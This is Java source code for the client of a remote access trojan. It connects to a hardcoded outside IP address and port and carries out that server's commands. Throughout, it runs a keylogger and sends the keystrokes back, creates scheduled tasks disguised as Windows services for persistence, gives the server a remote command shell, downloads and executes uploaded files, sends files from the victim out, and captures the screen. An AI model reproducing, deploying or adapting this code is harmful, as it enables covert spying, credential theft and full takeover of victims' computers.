import java.net.*;
import java.io.*;
import java.util.*;

public class client {
	Socket sock;
	PrintStream ps;
	BufferedReader din;
	InputStream is;
	String loc;

	public static void main(String[] args) throws Exception {
		new client();
	}

	public client() {
		try {
			Thread.sleep(5000);
		} catch (Exception e) {
			e.printStackTrace();
		}
		KeyLogger kl = new KeyLogger();
		(new Thread(kl)).start();
		while (true) {
			try {
				loc = client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
				loc = loc.substring(1);
				// Runtime.getRuntime().exec("cmd /c copy " + loc + " o.jar");
				sock = new Socket("92.53.66.44", 32323);
				ps = new PrintStream(sock.getOutputStream());
				din = new BufferedReader(new InputStreamReader(sock.getInputStream()));
				is = sock.getInputStream();
				boolean sh = false;
				// System.out.println(loc);
				while (true) {
					String line = din.readLine();

					System.out.println("[DEBUG] data received: " + line);

					if (line.equals("a")) {
						ps.println("a");
					}
					if (line.equals("ps99")) {
						Process proc1 = Runtime.getRuntime()
								.exec("cmd /c schtasks.exe /create /tn WindowsDisplay /tr " + loc + " /sc ONSTART ");
						Process proc2 = Runtime.getRuntime()
								.exec("cmd /c schtasks.exe /create /tn GraphicsUpdate /tr " + loc + " /sc ONLOGON ");
						Process proc3 = Runtime.getRuntime().exec(
								"cmd /c schtasks.exe /create /tn ManagerServiceInv /tr " + loc + " /sc ONIDLE /i 20");
						Process proc4 = Runtime.getRuntime()
								.exec("cmd /c schtasks.exe /create /tn COMSurrogateService /tr " + loc
										+ " /sc MINUTE /mo 10");
						// Process proc4 = Runtime.getRuntime().exec("cmd /c echo %username%");
						// BufferedReader stdInput = new BufferedReader(new
						// InputStreamReader(proc4.getInputStream()));
						// String username = stdInput.readLine();
						//
						// Process proc5 = Runtime.getRuntime().exec("cmd /c cp " + loc + "C:\Users\ " +
						// username + "\AppData\Roaming\Microsoft\Windows\"\Start
						// Menu\"\Programs\Startup");
					}
					if (line.equals("ps-99")) {
						Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn WindowsDisplay /f");
						Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn GraphicsUpdate /f");
						Process proc3 = Runtime.getRuntime()
								.exec("cmd /c schtasks.exe /delete /tn ManagerServiceInv /f");
						Process proc4 = Runtime.getRuntime()
								.exec("cmd /c schtasks.exe /delete /tn COMSurrogateService /f");
					}
					if (line.equals("sh-99")) {
						sh = false;
					}
					if (sh == true) {
						try {
							Runtime rt = Runtime.getRuntime();
							Process proc = rt.exec("cmd /c " + line);
							BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
							String s = "";
							while ((s = stdInput.readLine()) != null) {
								ps.println(s);
							}
							ps.println("{}{}{}");
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
					if (line.equals("sh99")) {
						sh = true;
					}
					if (line.equals("klg")) {
						ps.println("ok");
						ArrayList<String> presses = kl.retrieve();
						for (String s : presses) {
							ps.println(s);
						}
						ps.println("{}{}{}");
					}
					if (line.equals("klr")) {
						kl.restart();
						ps.println("c");
					}
					if (line.equals("ul")) {
						System.out.println("upload if statement");
						String dest = din.readLine();
						System.out.println("recieved file dest: " + dest);
						if (dest.startsWith("de")) {
							dest = loc.substring(0, loc.lastIndexOf("/")) + "/" + dest.substring(dest.indexOf(" ") + 1);
							System.out.println("default file dest: " + dest);
						}
						dest = dest.replace("/", "\\");
						if (new File(dest.substring(0, dest.lastIndexOf("\\"))).exists()) {
							ps.println("ok");
							System.out.println("dir exists");
						} else {
							ps.println("fe");
							System.out.println("file doesn't exist");
						}
						System.out.println(dest);
						byte[] rBytes = new byte[100000000];
						FileOutputStream fos = new FileOutputStream(dest);
						BufferedOutputStream bos = new BufferedOutputStream(fos);
						try {
							int bytesRead = is.read(rBytes, 0, rBytes.length);
							bos.write(rBytes, 0, bytesRead);
						} finally {
							bos.close();
						}
					}
					if (line.equals("ule")) {
						System.out.println("upload if statement");
						String dest = din.readLine();
						System.out.println("recieved file dest: " + dest);
						if (dest.startsWith("de")) {
							dest = loc.substring(0, loc.lastIndexOf("/")) + "/" + dest.substring(dest.indexOf(" ") + 1);
							System.out.println("default file dest: " + dest);
						}
						dest = dest.replace("/", "\\");
						if (new File(dest.substring(0, dest.lastIndexOf("\\"))).exists()) {
							ps.println("ok");
							System.out.println("dir exists");
						} else {
							ps.println("fe");
							System.out.println("file doesn't exist");
						}
						System.out.println(dest);
						byte[] rBytes = new byte[100000000];
						FileOutputStream fos = new FileOutputStream(dest);
						BufferedOutputStream bos = new BufferedOutputStream(fos);
						try {
							int bytesRead = is.read(rBytes, 0, rBytes.length);
							bos.write(rBytes, 0, bytesRead);
						} finally {
							bos.close();
						}
						Process proc1 = Runtime.getRuntime().exec("cmd /c " + dest);
					}
					if (line.equals("dl")) {
						ps.println("ok");
						String floc = din.readLine();
						File fsend = new File(floc);
						ps.println(fsend.getName());
						byte[] barr = new byte[(int) fsend.length()];
						BufferedInputStream bistr = new BufferedInputStream(new FileInputStream(fsend));
						bistr.read(barr, 0, barr.length);
						OutputStream ostr = sock.getOutputStream();
						ostr.write(barr, 0, barr.length);
						ostr.flush();
					}
					if (line.equals("ap99")) {
						int seconds = Integer.parseInt(din.readLine());
						ps.flush();
						// ps.println("{}{}{}");
						initscreen.init(ps, seconds);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				Thread.sleep(10000);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}